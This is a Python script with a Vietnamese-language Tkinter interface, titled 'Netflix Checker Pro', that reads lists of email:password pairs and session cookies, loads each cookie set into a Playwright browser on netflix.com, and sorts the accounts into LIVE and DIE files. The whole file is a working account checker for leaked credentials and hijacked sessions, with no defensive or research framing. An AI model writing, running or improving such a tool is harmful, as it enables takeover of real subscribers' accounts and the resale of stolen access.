import sys
import json
import pandas as pd
import asyncio
import re
import os
from datetime import datetime
from playwright.async_api import async_playwright
from tkinter import Tk, filedialog, messagebox, Button, Label, Text, Scrollbar, Frame, BOTH, RIGHT, LEFT, Y
import threading

# Cấu hình encoding cho Windows
if sys.platform.startswith('win') and sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding='utf-8')

MAX_CONCURRENT_TASKS = 5

def parse_line_custom(line):
    try:
        line = line.strip()
        if not line: return None
        
        # Regex tách Email và Password
        match_user_pass = re.search(r'^([^:]+):([^|]+)', line)
        if not match_user_pass:
            return None
        
        email = match_user_pass.group(1).strip()
        password = match_user_pass.group(2).strip()
        
        # Regex lấy trọn bộ nội dung trong ngoặc nhọn sau COOKIES =
        cookie_match = re.search(r'COOKIES\s*=\s*(\{.*\})', line)
        cookies_str = cookie_match.group(1).strip() if cookie_match else ""
        
        return {"email": email, "password": password, "cookies": cookies_str}
    except Exception:
        return None
    
def parse_cookie_string(cookie_str):
    cookies = []
    try:
        parts = cookie_str.split(";")
        for part in parts:
            part = part.strip()
            if not part:
                continue

            if "=" not in part:
                continue

            name, value = part.split("=", 1)

            cookies.append({
                "name": name.strip(),
                "value": value.strip(),
                "domain": ".netflix.com",
                "path": "/",
                "httpOnly": False,
                "secure": True
            })

        return cookies
    except:
        return []

def normalize_cookies(raw_cookies_str):
    try:
        data = json.loads(raw_cookies_str)
        raw_list = data.get('cookies', []) if isinstance(data, dict) else data
        normalized = []
        for c in raw_list:
            cookie = {k: c.get(k, c.get(k.lower(), '')) for k in ['name', 'value', 'domain', 'path', 'httpOnly', 'secure']}
            cookie['path'] = cookie.get('path', '/')
            ss = c.get('sameSite', '') or c.get('same_site', '')
            if isinstance(ss, str) and ss.lower() in ('strict', 'lax', 'none'):
                cookie['sameSite'] = ss.capitalize()
            normalized.append(cookie)
        return normalized
    except:
        return []

async def check_cookie_session_async(row, semaphore, alive_rows, dead_rows):
    async with semaphore:
        email = row['email']
        try:
            cookies = parse_cookie_string(row['cookies'])
            if not cookies:
                dead_rows.append({**row, "reason": "Cookie lỗi định dạng"})
                gui_log(f"[-] {email}: Cookie lỗi", "error")
                return

            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=False)
                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                )
                await context.add_cookies(cookies)
                page = await context.new_page()

                await page.goto("https://www.netflix.com/vn/login", timeout=60000)
                await asyncio.sleep(2)

                if "/browse" in page.url.lower():
                    alive_rows.append(row)
                    gui_log(f"[+] {email}: LIVE", "account_alive")
                else:
                    dead_rows.append({**row, "reason": "Cookie Die"})
                    gui_log(f"[-] {email}: DIE", "account_dead")

                await browser.close()
        except Exception as e:
            gui_log(f"[!] {email}: Error {e}", "error")

async def process_txt_file(filepath):
    if not filepath: return
    
    # Tạo tên file output dựa trên tên file đầu vào + thời gian
    base_name = os.path.splitext(os.path.basename(filepath))[0]
    timestamp = datetime.now().strftime("%d-%m_%H-%M")
    pass_filename = f"{base_name}_LIVE_{timestamp}.csv"
    dead_filename = f"{base_name}_DIE_{timestamp}.xlsx"

    valid_data = []
    with open(filepath, 'r', encoding='utf-8') as f:
        for line in f:
            parsed = parse_line_custom(line)
            if parsed: valid_data.append(parsed)
    
    if not valid_data:
        messagebox.showwarning("Lỗi", "File không đúng định dạng!")
        return

    gui_log(f"Đang xử lý {len(valid_data)} dòng...", "info")
    
    alive_rows, dead_rows = [], []
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
    tasks = [check_cookie_session_async(row, semaphore, alive_rows, dead_rows) for row in valid_data]
    await asyncio.gather(*tasks)

    # Xuất file LIVE
    if alive_rows:
        df_alive = pd.DataFrame(alive_rows)
        df_alive[['email', 'password', 'cookies']].to_csv(pass_filename, index=False, encoding='utf-8-sig')
    
    # Xuất file DIE
    if dead_rows:
        pd.DataFrame(dead_rows).to_excel(dead_filename, index=False)

    messagebox.showinfo("Xong", f"Thành công!\nFile Live: {pass_filename}\nFile Die: {dead_filename}")

async def process_excel_file(filepath):
    if not filepath:
        return

    base_name = os.path.splitext(os.path.basename(filepath))[0]
    timestamp = datetime.now().strftime("%d-%m_%H-%M")
    pass_filename = f"{base_name}_LIVE_{timestamp}.csv"
    dead_filename = f"{base_name}_DIE_{timestamp}.xlsx"

    df = pd.read_excel(filepath, header=None)

    df.columns = ["email", "password", "cookies"]

    valid_data = df.to_dict("records")

    gui_log(f"Đang xử lý {len(valid_data)} dòng...", "info")

    alive_rows, dead_rows = [], []
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)

    tasks = [
        check_cookie_session_async(row, semaphore, alive_rows, dead_rows)
        for row in valid_data
    ]

    await asyncio.gather(*tasks)

    if alive_rows:
        pd.DataFrame(alive_rows).to_csv(pass_filename, index=False, encoding='utf-8-sig')

    if dead_rows:
        pd.DataFrame(dead_rows).to_excel(dead_filename, index=False)

    messagebox.showinfo("Xong", f"Thành công!\nLive: {pass_filename}\nDie: {dead_filename}")

def gui_log(message, status="info"):
    if log_output:
        color = {"account_alive": "green", "account_dead": "red", "error": "orange"}.get(status, "black")
        log_output.insert("end", message + "\n", status)
        log_output.tag_config(status, foreground=color)
        log_output.see("end")

def main_gui():
    global log_output
    root = Tk()
    root.title("Netflix Checker Pro")
    root.geometry("750x450")

    Label(root, text="Netflix TXT Checker (Auto Timestamp)", font=("Arial", 12, "bold")).pack(pady=10)

    Button(
        root, text="CHỌN FILE .TXT VÀ CHẠY", bg="#e74c3c", fg="white", font=("Arial", 10, "bold"),
        command=lambda: threading.Thread(target=lambda: asyncio.run(process_txt_file(
            filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        )), daemon=True).start()
    ).pack(pady=10)

    frame = Frame(root)
    frame.pack(fill=BOTH, expand=True, padx=10, pady=10)
    scrollbar = Scrollbar(frame)
    scrollbar.pack(side=RIGHT, fill=Y)
    log_output = Text(frame, wrap="word", yscrollcommand=scrollbar.set, font=("Consolas", 9))
    log_output.pack(side=LEFT, fill=BOTH, expand=True)
    scrollbar.config(command=log_output.yview)

    root.mainloop()

if __name__ == "__main__":
    main_gui()